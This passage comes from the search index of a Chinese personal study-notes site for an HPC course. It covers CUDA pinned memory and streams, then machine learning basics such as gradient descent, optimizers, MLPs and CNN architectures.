<p>\u793a\u4f8b\uff1a <pre><code>int *host_a, *device_a;        // Define host-specific and device-specific arrays.\ncudaMalloc(&amp;device_a, size);   // `device_a` is immediately available on the GPU.\ncudaMallocHost(&amp;host_a, size); // `host_a` is immediately available on CPU, and is page-locked, or pinned.\n\ninitializeOnHost(host_a, N);   // No CPU page faulting since memory is already allocated on the host.\n\n// `cudaMemcpy` takes the destination, source, size, and a CUDA-provided variable for the direction of the copy.\ncudaMemcpy(device_a, host_a, size, cudaMemcpyHostToDevice);\n\nkernel&lt;&lt;&lt;blocks, threads, 0, someStream&gt;&gt;&gt;(device_a, N);\n\n// `cudaMemcpy` can also copy data from device to host.\ncudaMemcpy(host_a, device_a, size, cudaMemcpyDeviceToHost);\n\nverifyOnHost(host_a, N);\n\ncudaFree(device_a);\ncudaFreeHost(host_a);          // Free pinned memory like this.\n</code></pre></p>"},{"location":"cs/hpc/hpc101/gpu/#cuda_1","title":"\u5e76\u53d1 CUDA \u6d41","text":"<p>\u5728 CUDA \u4e2d\uff0c\u6838\u51fd\u6570\u7684\u6267\u884c\u4ee5\u53ca\u4e00\u4e9b\u5185\u5b58\u4f20\u8f93\u5747\u5728 CUDA \u6d41\uff08CUDA Streams\uff09\u4e2d\u8fdb\u884c\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u76f4\u63a5\u542f\u52a8\u6838\u51fd\u6570\u4f1a\u5728\u9ed8\u8ba4\u6d41\u4e2d\u6267\u884c</p> <p>\u5728\u6bcf\u4e00\u4e2a\u6d41\u4e2d\uff0c\u4e0d\u540c\u7684\u6838\u51fd\u6570\u5206\u522b\u6267\u884c\uff1b\u4f46\u5728\u4e0d\u540c\u6d41\u4e2d\uff0c\u53ef\u4ee5\u5e76\u53d1\u6267\u884c\u591a\u4e2a\u6838\u51fd\u6570</p> <p>CUDA \u6d41\u884c\u4e3a\u7684\u51e0\u9879\u89c4\u5219\uff1a</p> <ul> <li>\u7ed9\u5b9a\u6d41\u4e2d\u7684\u6240\u6709\u64cd\u4f5c\u6309\u5e8f\u6267\u884c</li> <li>\u4e0d\u540c\u975e\u9ed8\u8ba4\u6d41\u4e2d\u7684\u64cd\u4f5c\u65e0\u6cd5\u4fdd\u8bc1\u5f7c\u6b64\u4e4b\u95f4\u7684\u6267\u884c\u987a\u5e8f</li> <li>\u9ed8\u8ba4\u6d41\u6709\u963b\u65ad\u80fd\u529b\uff0c\u5373\u5b83\u4f1a\u7b49\u5f85\u5176\u5b83\u5df2\u5728\u8fd0\u884c\u7684\u6240\u6709\u6d41\u5b8c\u6210\u5f53\u524d\u64cd\u4f5c\u4e4b\u540e\u624d\u4f1a\u8fd0\u884c\uff0c\u5e76\u4e14\u5728\u81ea\u8eab\u8fd0\u884c\u5b8c\u6bd5\u4e4b\u540e\u5176\u4ed6\u6d41\u624d\u53ef\u4ee5\u7ee7\u7eed\u4e0b\u4e00\u64cd\u4f5c\u7684\u8fd0\u884c</li> </ul> <p>\u4e5f\u5c31\u662f\uff1a</p> <p> </p> <p>\u6838\u51fd\u6570\u5728\u5404\u6d41\u4e2d\u6267\u884c\u7684\u60c5\u51b5\u4e5f\u53ef\u4ee5\u901a\u8fc7 nsys \u53ef\u89c6\u5316\u5206\u6790\u770b\u51fa\u6765</p>"},{"location":"cs/hpc/hpc101/gpu/#_13","title":"\u521b\u5efa\u3001\u4f7f\u7528\u3001\u9500\u6bc1\u975e\u9ed8\u8ba4\u6d41","text":"<p>CUDA \u4e2d\u6d41\u7684\u7c7b\u578b\u4e3a cudaStream_t\uff0c\u5e76\u4e14\u5229\u7528 cudaStreamCreate \u521b\u5efa\u975e\u9ed8\u8ba4\u6d41\uff0c\u7136\u540e\u4f5c\u4e3a\u7b2c\u56db\u4e2a\u6267\u884c\u914d\u7f6e\u53c2\u6570\u4f20\u7ed9\u6838\u51fd\u6570\u3002\u5728\u4f7f\u7528\u540e\u5229\u7528 cudaStreamDestroy \u9500\u6bc1\u6d41\u3002\u4e00\u4e2a\u4f8b\u5b50\uff1a <pre><code>cudaStream_t stream;\ncudaStreamCreate(&amp;stream);\nkernel&lt;&lt;&lt;number_of_blocks, threads_per_block, 0, stream&gt;&gt;&gt;();\ncudaStreamDestroy(stream);\n</code></pre> \u51e0\u4e2a\u9700\u8981\u6ce8\u610f\u7684\u5730\u65b9\uff1a</p> <ul> <li>cudaStreamCreate \u63a5\u6536 stream \u7684\u6307\u9488</li> <li>cudaStreamDestroy \u63a5\u6536 stream \u503c\uff08\u4e0d\u662f\u6307\u9488\uff09</li> <li>\u6267\u884c\u914d\u7f6e\u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\u4e0e\u5171\u4eab\u5185\u5b58\uff08Shared Memory\uff09\u6709\u5173\uff0c\u9ed8\u8ba4\u4e3a 0</li> </ul>"},{"location":"cs/hpc/hpc101/gpu/#_14","title":"\u4f7f\u7528\u6d41\u5b9e\u73b0\u6570\u636e\u4f20\u8f93\u548c\u4ee3\u7801\u7684\u91cd\u53e0\u6267\u884c","text":"<p>\u5728\u4ee5\u4e0b\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u5e76\u975e\u5728\u7b49\u5f85\u6574\u4e2a\u5185\u5b58\u62f7\u8d1d\u5b8c\u6210\u4e4b\u540e\u518d\u5f00\u59cb\u8fd0\u884c\u6838\u51fd\u6570\uff0c\u800c\u662f\u62f7\u8d1d\u5e76\u5904\u7406\u6240\u9700\u7684\u6570\u636e\u6bb5\uff0c\u5e76\u8ba9\u6bcf\u4e2a\u62f7\u8d1d/\u5904\u7406\u4e2d\u7684\u6570\u636e\u6bb5\u5747\u5728\u5404\u81ea\u7684\u975e\u9ed8\u8ba4\u6d41\u4e2d\u8fd0\u884c\u3002\u901a\u8fc7\u4f7f\u7528\u6b64\u6280\u672f\uff0c\u60a8\u53ef\u4ee5\u5f00\u59cb\u5904\u7406\u90e8\u5206\u6570\u636e\uff0c\u540c\u65f6\u4e3a\u540e\u7eed\u6bb5\u5e76\u53d1\u6267\u884c\u5185\u5b58\u4f20\u8f93\u3002\u4f7f\u7528\u6b64\u6280\u672f\u8ba1\u7b97\u64cd\u4f5c\u6b21\u6570\u7684\u6570\u636e\u6bb5\u7279\u5b9a\u503c\u548c\u6570\u7ec4\u5185\u7684\u504f\u79fb\u4f4d\u7f6e\u65f6\u5fc5\u987b\u683c\u5916\u5c0f\u5fc3\uff0c\u5982\u4e0b\u6240\u793a\uff1a <pre><code>int N = 2&lt;&lt;24;\nint size = N * sizeof(int);\n\nint *host_array;\nint *device_array;\n\ncudaMallocHost(&amp;host_array, size);               // Pinned host memory allocation.\ncudaMalloc(&amp;device_array, size);                 // Allocation directly on the active GPU device.\n\ninitializeData(host_array, N);                   // Assume this application needs to initialize on the host.\n\nconst int numberOfSegments = 4;                  // This example demonstrates slicing the work into 4 segments.\nint segmentN = N / numberOfSegments;             // A value for a segment's worth of `N` is needed.\nsize_t segmentSize = size / numberOfSegments;    // A value for a segment's worth of `size` is needed.\n\n// For each of the 4 segments...\nfor (int i = 0; i &lt; numberOfSegments; ++i) {\n    // Calculate the index where this particular segment should operate within the larger arrays.\n    segmentOffset = i * segmentN;\n\n    // Create a stream for this segment's worth of copy and work.\n    cudaStream_t stream;\n    cudaStreamCreate(&amp;stream);\n\n    // Asynchronously copy segment's worth of pinned host memory to device over non-default stream.\n    cudaMemcpyAsync(&amp;device_array[segmentOffset],  // Take care to access correct location in array.\n                    &amp;host_array[segmentOffset],    // Take care to access correct location in array.\n                    segmentSize,                   // Only copy a segment's worth of memory.\n                    cudaMemcpyHostToDevice,\n                    stream);                       // Provide optional argument for non-default stream.\n\n    // Execute segment's worth of work over same non-default stream as memory copy.\n    kernel&lt;&lt;&lt;number_of_blocks, threads_per_block, 0, stream&gt;&gt;&gt;(&amp;device_array[segmentOffset], segmentN);\n\n    // `cudaStreamDestroy` will return immediately (is non-blocking), but will not actually destroy stream until\n    // all stream operations are complete.\n    cudaStreamDestroy(stream);\n}\n</code></pre></p>"},{"location":"cs/hpc/hpc101/ml/","title":"\u673a\u5668\u5b66\u4e60\u57fa\u7840","text":"<p> \u7ea6 1788 \u4e2a\u5b57  11 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p> <p>Abstract</p> <p>\u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u516b\u6b21\u8bfe\u8bfe\u7a0b\u5185\u5bb9\uff0c\u7b2c\u4e94\u6b21\u5b9e\u9a8c\u5185\u5bb9</p> <p>\u53c2\u8003\uff1a</p> <ul> <li>\u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u516b\u6b21\u8bfe\u8bfe\u4ef6</li> </ul>"},{"location":"cs/hpc/hpc101/ml/#_2","title":"\u673a\u5668\u5b66\u4e60\u57fa\u7840","text":""},{"location":"cs/hpc/hpc101/ml/#_3","title":"\u7ebf\u6027\u56de\u5f52","text":"<ul> <li>\u4e00\u7ef4\uff1a\\(\\hat{y} = wx + b\\)</li> <li>N \u7ef4\uff1a\\(\\hat{y} = \\mathbf{w}^\\top\\mathbf{x} + b\\)</li> <li>\u635f\u5931\u51fd\u6570\uff1a\\(l^{(i)}(\\mathbf{w}, b) = \\dfrac{1}{2}(\\hat{y}^{(i)}-y^{(i)})^2\\)</li> <li>\u68af\u5ea6\u4e0b\u964d\u6cd5\u6c42\u89e3\u53c2\u6570</li> </ul>"},{"location":"cs/hpc/hpc101/ml/#_4","title":"\u68af\u5ea6\u4e0b\u964d","text":"<ul> <li>\\(L(\\mathbf{w}, b) = \\sum_il^{(i)}(\\mathbf{w}, b)\\)</li> <li>\u7528 \\((\\mathbf{w}, b)-\\eta\\nabla L(\\mathbf{w}, b)\\) \u4ee3\u66ff \\((\\mathbf{w}, b)\\)</li> <li>\u5b66\u4e60\u7387 \\(\\eta\\)\uff0c\u8d85\u53c2\u6570\uff08\u7528\u6765\u63a7\u5236\u5b66\u4e60\uff09\uff0c\u4e0b\u964d\u7684\u5feb\u6162<ul> <li>\u5b66\u4e60\u7387\u8fc7\u5927\u4f1a\u5728\u6700\u4f18\u9644\u8fd1\u6a2a\u8df3</li> <li>\u5b66\u4e60\u7387\u8fc7\u5c0f\u5219\u592a\u6162</li> <li>\u6839\u636e\u8fdb\u5ea6\u66f4\u6539\u5b66\u4e60\u7387<ul> <li>Linear Decay</li> <li>Linear Warmup\uff1a\u5148\u5c0f\uff0c\u7136\u540e\u589e\u5927\uff0c\u518d\u7f13\u6162\u53d8\u5c0f</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/hpc/hpc101/ml/#sgd","title":"SGD","text":"<p>Minibatch Stochastic Gradient Descent</p> <ul> <li>\u968f\u673a\u91c7\u7528\u4e00\u90e8\u5206\u6837\u672c\u6765\u8ba1\u7b97\u635f\u5931\u51fd\u6570</li> <li>\\(L(\\mathbf{w}, b) = \\sum_{i\\in B}l^{(i)}(\\mathbf{w}, b)\\)</li> <li>Batch size \\(s=|B|\\) \u4e5f\u662f\u4e00\u4e2a\u8d85\u53c2\u6570<ul> <li>\\(s\\) \u5c0f\uff0c\u5de5\u4f5c\u91cf\u5c0f\uff0c\u62df\u5408\u6548\u679c\u4e0d\u597d</li> <li>\\(s\\) \u5927\uff0c\u5185\u5b58\u6d88\u8017\u9ad8</li> </ul> </li> </ul>"},{"location":"cs/hpc/hpc101/ml/#_5","title":"\u6df1\u5ea6\u5b66\u4e60\u57fa\u7840","text":""},{"location":"cs/hpc/hpc101/ml/#_6","title":"\u591a\u5c42\u611f\u77e5\u5668","text":"<p>\u591a\u5c42\u611f\u77e5\u5668\uff08Multilayer Perceptrons\uff0c MLP\uff09\u662f\u4e00\u79cd\u524d\u5411\u7ed3\u6784\u7684\u4eba\u5de5\u795e\u7ecf\u7f51\u7edc\uff0c\u7ed3\u6784\u4f8b\u5982\uff1a</p> <p></p> <ul> <li>\u8f93\u5165\u5c42\uff08Input Layer\uff09\uff1a\\(\\mathbf{x}\\in\\mathbb{R}^n\\)</li> <li>\u9690\u85cf\u5c42\uff08Hidden Layer\uff09\uff1a\\(\\mathbf{h} = \\sigma(\\mathbf{W_1x}+\\mathbf{b_1})\\)<ul> <li>\\(\\mathbf{W_1}\\in\\mathbb{R}^{m\\times n}, \\mathbf{b_1}\\in\\mathbb{R}^m, \\mathbf{h}\\in\\mathbb{R}^m\\)</li> <li>\\(\\sigma\\)\uff1a\u6fc0\u6d3b\u51fd\u6570\uff08activation function\uff09</li> <li>\u53ef\u4ee5\u6709\u5f88\u591a\u9690\u85cf\u5c42\uff0c\u9010\u5c42\u4f20\u9012</li> </ul> </li> <li>\u8f93\u51fa\u5c42\uff08Output Layer\uff09\uff1a\\(\\mathbf{o} = \\mathbf{W_2h}+\\mathbf{b_2}\\)<ul> <li>\\(\\mathbf{W_2}\\in\\mathbb{R}^{k\\times m}, \\mathbf{b_2}\\in\\mathbb{R}^k, \\mathbf{o}\\in\\mathbb{R}^k\\)</li> </ul> </li> <li>\u7ed3\u679c\uff1a\\(\\mathbf{\\hat{y}}=\\sigma_2(\\mathbf{o})\\)</li> </ul>"},{"location":"cs/hpc/hpc101/ml/#forward-propagation","title":"\u524d\u5411\u4f20\u64ad\uff08Forward Propagation\uff09","text":"<p>\u6309\u987a\u5e8f\u4ece\u8f93\u5165\u5c42\u5f00\u59cb\u8ba1\u7b97\uff0c\u5f97\u5230\u6bcf\u4e00\u5c42\u7684\u8f93\u51fa\u7ed3\u679c</p>"},{"location":"cs/hpc/hpc101/ml/#back-propagation","title":"\u53cd\u5411\u4f20\u64ad\uff08Back Propagation\uff09","text":"<p>\u5229\u7528\u94fe\u5f0f\u6cd5\u5219\u6765\u8ba1\u7b97\u795e\u7ecf\u7f51\u7edc\u4e2d\u5404\u53c2\u6570\u7684\u68af\u5ea6</p> <p></p>"},{"location":"cs/hpc/hpc101/ml/#_7","title":"\u6fc0\u6d3b\u51fd\u6570","text":"<p>\u6ca1\u6709\u6fc0\u6d3b\u51fd\u6570\u7684\u60c5\u51b5\uff1a</p> <ul> <li>\\(\\mathbf{h} = \\mathbf{W_1x}+\\mathbf{b_1}\\)</li> <li>\\(\\mathbf{o} = \\mathbf{W_2h}+\\mathbf{b_2} = \\mathbf{W_1W_2x}+\\mathbf{b_1}+\\mathbf{b_2}\\) \u4ecd\u4e3a\u7ebf\u6027\u7684</li> </ul> <p>\u800c\u6fc0\u6d3b\u51fd\u6570\u4f7f\u5f97 \\(\\mathbf{h} = \\sigma(\\mathbf{W_1x}+\\mathbf{b_1})\\)\uff0c\u8ba9 MLP \u53d8\u4e3a\u975e\u7ebf\u6027\u7684</p> <p>\u4e00\u4e9b\u6fc0\u6d3b\u51fd\u6570\uff1a</p> <ul> <li>sigmoid\uff1a\\(\\text{sigmoid}(x) = \\dfrac{1}{1+e^{-x}}\\)\uff0c\u5bfc\u6570\uff1a\\(\\text{sigmoid}(x)(1-\\text{sigmoid}(x))\\)</li> <li>tanh\uff1a\\(\\tanh(x) = \\dfrac{1-e^{-2x}}{1+e^{-2x}}\\)\uff0c\u5bfc\u6570\uff1a\\(1-\\tanh^2(x)\\)</li> <li>ReLU\uff1a\\(\\text{ReLU}(x)=\\max(x, 0)\\)<ul> <li>Rectified Linear Unit</li> <li>\u5c4f\u853d\u6389\u8d1f\u503c</li> </ul> </li> <li>softmax\uff1a\\(\\text{softmax}(\\mathbf{o})_i = \\dfrac{e^{o_i}}{\\sum_{j=1}^ke^{o_j}}\\)<ul> <li>\u5c06\u8f93\u51fa\u7684\u503c\u8f6c\u5316\u4e3a\u6982\u7387\uff08\u548c\u4e3a 1\uff09</li> </ul> </li> </ul>"},{"location":"cs/hpc/hpc101/ml/#_8","title":"\u89c4\u8303\u5316","text":"<p>#TODO\uff0cPPT 55-59 \u9875\uff0c\u6ca1\u61c2</p>"},{"location":"cs/hpc/hpc101/ml/#_9","title":"\u4f18\u5316\u7b97\u6cd5","text":"<p>SGD\uff1a\\(W\\leftarrow W-\\eta\\nabla L(W)\\)</p>"},{"location":"cs/hpc/hpc101/ml/#sgd-momentum","title":"SGD + Momentum","text":"<p>SGD \u53ea\u4f9d\u8d56\u5f53\u524d batch \u8ba1\u7b97\u5f97\u5230\u7684\u68af\u5ea6\u6765\u66f4\u65b0\uff0c\u4e0d\u7a33\u5b9a\u3002\u5728\u68af\u5ea6\u4e0b\u964d\u8fc7\u7a0b\u4e2d\u52a0\u5165\u52a8\u91cf\uff0c\u7d2f\u79ef\u5386\u6b21\u8ba1\u7b97\u7684\u68af\u5ea6\uff0c\u4f7f\u4e4b\u66f4\u7a33\u5b9a\uff0c\u800c\u4e14\u9632\u6b62\u9677\u5165\u5c40\u90e8\u6700\u4f18\u89e3</p> <ul> <li>\\(v\\leftarrow \\rho v+\\nabla L(W)\\)<ul> <li>\\(v\\)\uff1a\"velocity\"\uff0c\u7d2f\u79ef\u7684\u68af\u5ea6</li> <li>\\(\\rho\\)\uff1a\"friction\"\uff0c\u52a8\u91cf\u56e0\u5b50\uff0c\u4e00\u822c\u4e3a 0.9 \u6216 0.99</li> </ul> </li> <li>\\(W\\leftarrow W-\\eta v\\)</li> </ul>"},{"location":"cs/hpc/hpc101/ml/#adagrad","title":"AdaGrad","text":"<p>\u8bbe\u7f6e\u5168\u5c40\u5b66\u4e60\u7387\u4e4b\u540e\uff0c\u6bcf\u6b21\u901a\u8fc7\u5168\u5c40\u5b66\u4e60\u7387\u9010\u53c2\u6570\u7684\u9664\u4ee5\u5386\u53f2\u68af\u5ea6\u5e73\u65b9\u548c\u7684\u5e73\u65b9\u6839\u4f7f\u5f97\u6bcf\u4e2a\u53c2\u6570\u7684\u5b66\u4e60\u7387\u4e0d\u540c</p> <p>\u5728\u53c2\u6570\u7a7a\u95f4\u66f4\u4e3a\u5e73\u7f13\u7684\u65b9\u5411\uff0c\u4f1a\u53d6\u5f97\u66f4\u5927\u7684\u8fdb\u6b65\uff08\u56e0\u4e3a\u5e73\u7f13\uff0c\u6240\u4ee5\u5386\u53f2\u68af\u5ea6\u5e73\u65b9\u548c\u8f83\u5c0f\uff0c\u5bf9\u5e94\u5b66\u4e60\u4e0b\u964d\u7684\u5e45\u5ea6\u8f83\u5c0f\uff09\uff0c\u5e76\u4e14\u80fd\u591f\u4f7f\u5f97\u9661\u5ced\u7684\u65b9\u5411\u53d8\u5f97\u5e73\u7f13\uff0c\u4ece\u800c\u52a0\u5feb\u8bad\u7ec3\u901f\u5ea6</p> <ul> <li>\\(s\\leftarrow s+(\\nabla L(W))^2\\)<ul> <li>\\(s\\)\uff1a\u7d2f\u79ef\u5e73\u65b9\u68af\u5ea6</li> <li>\u5e73\u65b9\u662f\u9010\u5143\u7d20\u76f8\u4e58</li> </ul> </li> <li>\\(W\\leftarrow W-\\dfrac{\\eta}{\\sqrt{s}+\\epsilon}\\nabla L(W)\\)<ul> <li>\\(\\epsilon\\)\uff1a\u4e3a\u4e86\u7ef4\u6301\u6570\u503c\u7a33\u5b9a\u6027\uff0c\u4e00\u822c\u4e3a \\(10^{-6}\\) \u6216 \\(10^{-7}\\) \u4e4b\u7c7b\u5c0f\u5e38\u6570</li> </ul> </li> </ul>"},{"location":"cs/hpc/hpc101/ml/#adam","title":"Adam","text":"<p>\u5bf9\u68af\u5ea6\u7684\u4e00\u9636\u77e9\u4f30\u8ba1\uff08First Moment Estimation\uff0c\u5373\u68af\u5ea6\u7684\u5747\u503c\uff09\u548c\u4e8c\u9636\u77e9\u4f30\u8ba1\uff08Second Moment Estimation\uff0c\u5373\u68af\u5ea6\u7684\u672a\u4e2d\u5fc3\u5316\u7684\u65b9\u5dee\uff09\u8fdb\u884c\u7efc\u5408\u8003\u8651\uff0c\u8ba1\u7b97\u51fa\u66f4\u65b0\u6b65\u957f\uff0c\u6548\u679c\u66f4\u597d</p> <ul> <li>\u8fed\u4ee3\u6b21\u6570\u8bb0\u4e3a \\(i=1, \\dots, n\\)</li> <li>\\(v\\leftarrow \\beta_1v+(1-\\beta_1)\\nabla L(W)\\)</li> <li>\\(s\\leftarrow \\beta_2s+(1-\\beta_2)(\\nabla L(W))^2\\)</li> <li>Bias correction\uff1a\\(v'=\\dfrac{v}{1-\\beta_1^i}, s'=\\dfrac{s}{1-\\beta_2^i}\\)</li> <li>\\(W\\leftarrow W-\\eta\\dfrac{v'}{\\sqrt{s'}+\\epsilon}\\)</li> <li>\u4e00\u822c\u60c5\u51b5\u4e0b\u901a\u5e38\u8bbe \\(\\beta_1=0.9, \\beta_2=0.999, \\eta=10^{-3}\\) \u6216 \\(5\\times 10^{-4}\\)</li> </ul>"},{"location":"cs/hpc/hpc101/ml/#_10","title":"\u5377\u79ef\u795e\u7ecf\u7f51\u7edc","text":"<p>\u5377\u79ef\u795e\u7ecf\u7f51\u7edc\uff08Convolutional Neural Network\uff0cCNN\uff09\u662f\u4e00\u7c7b\u5f3a\u5927\u7684\u3001\u4e3a\u5904\u7406\u56fe\u50cf\u6570\u636e\u800c\u8bbe\u8ba1\u7684\u795e\u7ecf\u7f51\u7edc</p>"},{"location":"cs/hpc/hpc101/ml/#_11","title":"\u5377\u79ef","text":"<p>\u4e00\u7ef4\u5377\u79ef\uff1a</p> \\[ (f*g)(x)=\\int_{-\\infty}^\\infty f(\\tau)g(t-\\tau)\\mathrm d\\tau \\] <p>\u79bb\u6563\u5f62\u5f0f\uff1a</p> \\[ (f*g)(n)=\\sum_{m=-\\infty}^\\infty f(m)g(n-m) \\] <p>\u4e8c\u7ef4\u79bb\u6563\u5377\u79ef\uff1a</p> \\[ (f*g)(i, j)=\\sum_a\\sum_bf(a, b)g(i-a, j-b) \\] <p>\u56fe\u50cf\u5377\u79ef/\u4e92\u76f8\u5173\uff08cross-correlation\uff09</p> <p></p> <p>\u5e26 padding \u7684\u4e8c\u7ef4\u5377\u79ef</p> <ul> <li>\u5728\u5468\u56f4\u586b\u5145</li> <li>\u53ef\u4ee5\u586b\u5145 0\uff0c\u4e5f\u53ef\u4ee5\u586b\u5145\u4e34\u8fd1\u7684\u6570</li> </ul> <p></p> <p>\u5e26\u6b65\u5e45\uff08stride\uff09\u7684\u4e8c\u7ef4\u5377\u79ef\uff08\u4e0b\u56fe\u6c34\u5e73\u6b65\u5e45\u4e3a 2\uff0c\u5782\u76f4\u6b65\u5e45\u4e3a 3\uff09</p> <p></p> <p>\u591a\u901a\u9053\u5377\u79ef\uff08\u4f1a\u964d\u7ef4\uff09</p> <p></p> <p>\u591a\u8f93\u51fa\u901a\u9053\u5377\u79ef\uff08\u5982\u56fe\u4e3a \\(1\\times 1\\) \u5377\u79ef\uff09</p> <p></p>"},{"location":"cs/hpc/hpc101/ml/#_12","title":"\u6c47\u805a\uff08\u6c60\u5316\uff09","text":"<p>\u6c60\u5316\u5373 pooling\uff0c\u4e0e\u5377\u79ef\u5c42\u7c7b\u4f3c\uff0c\u53ea\u662f\u4e0d\u8fdb\u884c\u4e58\u6cd5\u64cd\u4f5c\uff0c\u4e5f\u4e0d\u9700\u8981\u6838\uff0c\u53ea\u662f\u901a\u8fc7\u7a97\u53e3\u5212\u5206\u533a\u57df\uff0c\u7136\u540e\u505a\u52a0\u6cd5/\u53d6\u6700\u5927\u503c/\u53d6\u5e73\u5747\u3002\u4f8b\u5982\u6700\u5927\u6c47\u805a\u5c42\uff1a</p> <p></p> <p>\u6c47\u805a\u5c42\u4f5c\u7528\uff1a\u964d\u4f4e\u5377\u79ef\u5c42\u5bf9\u4f4d\u7f6e\u7684\u654f\u611f\u6027\uff0c\u540c\u65f6\u964d\u4f4e\u5bf9\u7a7a\u95f4\u964d\u91c7\u6837\u8868\u793a\u7684\u654f\u611f\u6027</p>"},{"location":"cs/hpc/hpc101/ml/#lenet","title":"LeNet","text":"<p>1989 \u5e74\u63d0\u51fa\u7684 CNN \u6a21\u578b\uff08LeNet-5\uff09\uff0c\u7528\u6765\u4ece 28*28 \u7684\u8f93\u5165\u56fe\u7247\u4e2d\u8bc6\u522b\u6570\u5b57\uff0c\u7ed3\u6784\uff1a</p> <p></p> <p>\u5305\u542b\u4e24\u4e2a\u90e8\u5206\uff1a</p> <ul> <li>\u5377\u79ef\u7f16\u7801\u5668\uff1a\u6bcf\u4e2a\u5377\u79ef\u5757\u662f\u4e00\u4e2a\u5377\u79ef\u5c42\uff085*5 \u5377\u79ef\u6838\uff0cpadding \u4e3a 2\uff09\uff0c\u4e00\u4e2a sigmoid \u6fc0\u6d3b\u51fd\u6570\uff0c\u4e00\u4e2a\u5e73\u5747\u6c47\u805a\u5c42\uff082*2 \u6c60\uff0cstride \u4e3a 2\uff09<ul> <li>\u7b2c\u4e00\u5c42\u6709 6 \u4e2a\u901a\u9053\uff0c\u7b2c\u4e8c\u5c42\u6709 16 \u4e2a\u901a\u9053</li> </ul> </li> <li>\u5168\u8fde\u63a5\u5c42\u5bc6\u96c6\u5757\uff1a\u6709\u4e09\u4e2a\u5168\u8fde\u63a5\u5c42\uff08\u4e2d\u95f4\u662f sigmoid \u6fc0\u6d3b\u51fd\u6570\uff09<ul> <li>\u4e09\u4e2a\u5168\u8fde\u63a5\u5c42\u8f93\u51fa\u4e2a\u6570\u4f9d\u6b21\u4e3a 120\u300184\u300110\uff08\u6700\u7ec8 10 \u4e2a\u6570\u5b57\uff09</li> </ul> </li> </ul>"},{"location":"cs/hpc/hpc101/ml/#_13","title":"\u73b0\u4ee3\u5377\u79ef\u795e\u7ecf\u7f51\u7edc","text":""},{"location":"cs/hpc/hpc101/ml/#alexnet","title":"AlexNet","text":"<p>\u548c LeNet \u7ed3\u6784\u548c\u8bbe\u8ba1\u7406\u5ff5\u7c7b\u4f3c\u3002\u8f93\u5165\u4e00\u4e2a 224*224 \u5e26\u4e09\u901a\u9053\u7684\u56fe\u7247\uff0c\u8f93\u51fa\u8bc6\u522b\u51fa\u7684\u7269\u4f53\u7c7b\u522b\uff08\u4e00\u5171 1000 \u79cd\uff09\uff0c\u7ed3\u6784\uff1a</p> <p>\u56fe\u7247\uff083*224*224\uff09-&gt; 11*11 \u5377\u79ef\u5c42\uff0896 \u901a\u9053\uff0cstride 4\uff09-&gt; 3*3 \u6700\u5927\u6c47\u805a\u5c42\uff08stride 2\uff09-&gt; 5*5 \u5377\u79ef\u5c42\uff08256 \u901a\u9053\uff0cpadding 2\uff09-&gt; 3*3 \u6700\u5927\u6c47\u805a\u5c42\uff08stride 2\uff09-&gt; 3*3 \u5377\u79ef\u5c42\uff08384 \u901a\u9053\uff0cpadding 1\uff09-&gt; 3*3 \u5377\u79ef\u5c42\uff08384 \u901a\u9053\uff0cpadding 1\uff09-&gt; 3*3 \u5377\u79ef\u5c42\uff08256 \u901a\u9053\uff0cpadding 1\uff09-&gt; 3*3 \u6700\u5927\u6c47\u805a\u5c42\uff08stride 2\uff09-&gt; \u5168\u8fde\u63a5\u5c42\uff08\u8f93\u51fa 4096\uff09-&gt; \u5168\u8fde\u63a5\u5c42\uff08\u8f93\u51fa 4096\uff09-&gt; \u5168\u8fde\u63a5\u5c42\uff08\u8f93\u51fa 1000\uff09</p> <p>\u6fc0\u6d3b\u51fd\u6570\u4f7f\u7528 ReLU</p>"},{"location":"cs/hpc/hpc101/ml/#vgg","title":"VGG","text":"<p>\u4f7f\u7528\u4e86\u66f4\u5c0f\u7684\u5377\u79ef\u6838\uff083*3\uff09\u548c 2*2 \u7684\u6700\u5927\u6c47\u805a\u5c42\uff0c\u6709\u66f4\u6df1\u7684\u5c42\u7ea7\uff0816-19 \u5c42\uff09</p>"},{"location":"cs/hpc/hpc101/ml/#googlenet","title":"GoogLeNet","text":"<p>\u4f7f\u7528\u4e86 Inception \u5757\uff1a</p> <p></p>"},{"location":"cs/hpc/hpc101/ml/#resnet","title":"ResNet","text":"<p>\u5373\u6b8b\u5dee\u7f51\u7edc\uff0c\u4f7f\u7528\u4e86\u6b8b\u5dee\u5757\uff0c\u5b66\u4e60 \\(f(x)-x\\) \u6765\u786e\u4fdd \\(\\mathcal{F}_i\\subset\\mathcal{F}_{i+1}\\)\uff0c\u9010\u6b21\u6536\u655b\u5230\"\u771f\u5b9e\"\u51fd\u6570 \\(f^*\\)</p> <p></p>"},{"location":"cs/hpc/hpc101/ml/#_14","title":"\u8fc1\u79fb\u5b66\u4e60","text":"<p>\u8fc1\u79fb\u5b66\u4e60\uff08Transfer Learning\uff09\u662f\u6307\u5728\u539f\u6709\u6570\u636e\u96c6\u8bad\u7ec3\u597d\u53c2\u6570\u540e\uff0c\u66f4\u6362\u6570\u636e\u96c6\u65f6\u53ea\u9700\u8981\u91cd\u65b0\u8bad\u7ec3\u5168\u8fde\u63a5\u90e8\u5206</p> <ul> <li>\u5bf9\u4e8e\u5c0f\u6570\u636e\u96c6\uff0c\u4ec5\u521d\u59cb\u5316\u5168\u8fde\u63a5\u8f93\u51fa\u5c42\u5e76\u91cd\u65b0\u8bad\u7ec3\uff0c\u56fa\u5b9a\u5176\u5b83\u5c42\u53c2\u6570\uff0c\u53ea\u6539\u53d8\u5168\u8fde\u63a5\u8f93\u51fa\u5c42\u53c2\u6570</li> <li>\u5bf9\u4e8e\u5927\u6570\u636e\u96c6\uff0c\u4ec5\u521d\u59cb\u5316\u5168\u8fde\u63a5\u8f93\u51fa\u5c42\u548c\u5168\u8fde\u63a5\u9690\u85cf\u5c42\uff0c\u56fa\u5b9a\u5176\u5b83\u5c42\u53c2\u6570\uff0c\u91cd\u65b0\u8bad\u7ec3</li> </ul>"},{"location":"cs/hpc/hpc101/ml/#_15","title":"\u5faa\u73af\u795e\u7ecf\u7f51\u7edc","text":"<p>\u5faa\u73af\u795e\u7ecf\u7f51\u7edc\uff08Recurrent Neural 